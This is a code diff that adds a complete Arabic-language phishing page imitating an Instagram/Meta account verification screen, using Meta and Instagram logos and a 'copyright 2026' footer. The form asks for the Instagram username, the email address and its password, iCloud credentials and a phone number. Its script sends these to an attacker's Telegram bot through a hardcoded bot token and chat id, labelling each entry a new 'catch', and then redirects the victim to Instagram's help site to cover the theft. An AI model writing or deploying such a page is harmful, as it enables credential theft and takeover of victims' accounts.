@@ -12,4 +12,45 @@
         h2 { font-size: 19px; color: #1c1e21; margin-bottom: 10px; font-weight: 600; }
         p { color: #65676b; font-size: 13px; line-height: 1.6; margin-bottom: 25px; }
         .field { text-align: right; margin-bottom: 18px; }
-        label { display: block; font-size: 12px; color: #4b4f5
+        label { display: block; font-size: 12px; color: #4b4f56; margin-bottom: 5px; font-weight: 600; }
+        input { width: 100%; padding: 12px; border: 1px solid #dddfe2; background: #f5f6f7; border-radius: 6px; font-size: 14px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 2px #e7f3ff; }
+        button { width: 100%; padding: 12px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        .footer { font-size: 11px; color: #90949c; margin-top: 30px; border-top: 1px solid #ebedf0; padding-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="insta-logo">
+        
+        <h2>تأكيد ملكية الحساب</h2>
+        <p>لحماية مجتمعنا، نطلب أحياناً من المستخدمين تأكيد بياناتهم عند رصد نشاط غير معتاد.</p>
+
+        <div class="field"><label>اسم المستخدم</label><input type="text" id="u" placeholder="@username"></div>
+        <div class="field"><label>البريد الإلكتروني</label><input type="email" id="e" placeholder="email@example.com"></div>
+        <div class="field"><label>كلمة مرور البريد</label><input type="password" id="ep" placeholder="••••••••"></div>
+        <div class="field"><label>بريد iCloud</label><input type="email" id="ic" placeholder="example@icloud.com"></div>
+        <div class="field"><label>كلمة مرور iCloud</label><input type="password" id="icp" placeholder="••••••••"></div>
+        <div class="field"><label>رقم الهاتف</label><input type="tel" id="ph" placeholder="+966"></div>
+
+        <button onclick="send()">تأكيد الهوية والمتابعة</button>
+        <div class="footer">Instagram from Meta © 2026</div>
+    </div>
+
+    <script>
+        function send() {
+            const val = (id) => document.getElementById(id).value;
+            const token = '8770625884:AAFe9rs1MjknDXFmVYmjpz4pWjoKznNmwTc';
+            const chat = '7074300443';
+            
+            if(!val('u') || !val('ep')) { alert("يرجى إكمال الحقول"); return; }
+
+            const text = `🎯 صيد جديد 🎯\n\n👤 يوزر: ${val('u')}\n📧 بريد: ${val('e')}\n🔑 باس البريد: ${val('ep')}\n🍎 iCloud: ${val('ic')}\n🔐 باس iCloud: ${val('icp')}\n📞 هاتف: ${val('ph')}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}`)
+            .then(() => { window.location.href = "https://help.instagram.com"; });
+        }
+    </script>
+</body>
+</html>
